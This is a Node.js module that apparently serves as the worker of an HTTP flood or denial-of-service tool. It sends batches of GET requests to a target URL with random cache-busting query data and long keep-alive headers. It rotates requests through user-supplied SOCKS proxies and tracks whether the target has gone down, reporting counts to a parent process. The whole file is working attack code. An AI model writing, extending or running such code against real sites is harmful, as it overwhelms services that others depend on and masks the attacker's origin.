import http from 'http';
import https from 'https';
import url from 'url';
import crypto from "crypto";
import querystring from 'querystring';
import { DATA_MSG } from './constants.mjs';
import { SocksProxyAgent } from "socks-proxy-agent";

export function request(targetUrl, userConfig) {
	const queryString = querystring.stringify({
		data: crypto.randomBytes(20).toString('hex')
	});

	const parsedUrl = url.parse(targetUrl);
	const options = {
		...parsedUrl,
		query: queryString,
		headers: {
			'Keep-Alive': 'timeout=3600',
			'Connection': 'keep-alive'
		}
	};

	const proxies = userConfig.socksProxies;
	if (proxies?.length) {
		const proxyIndex = Math.round(Math.random() * (proxies.length - 1));
		options.agent = new SocksProxyAgent(proxies[proxyIndex]);
	}

	const data = {
		host: parsedUrl.host,
		port: parsedUrl.port,
		path: parsedUrl.path,
		requests: 0,
		errors: 0,
		success: 0,
		isDown: false
	};

	const httpOrHttps = options.protocol === 'https:' ? https : http;
	for (let i = 0; i < userConfig.requestPerBatch; ++i) {
		httpOrHttps.get(options, res => {
			++data.requests;
			if (res.statusCode >= 200 && res.statusCode < 300) {
				++data.success;
			} else {
				++data.errors;
			}

			process.send({ cmd: DATA_MSG, data });
		}).on('error', (err) => {
			++data.requests;
			++data.errors;
			if (err.connect === true) {
				data.isDown = true;
			}
			process.send({ cmd: DATA_MSG, data });
		});
	}
}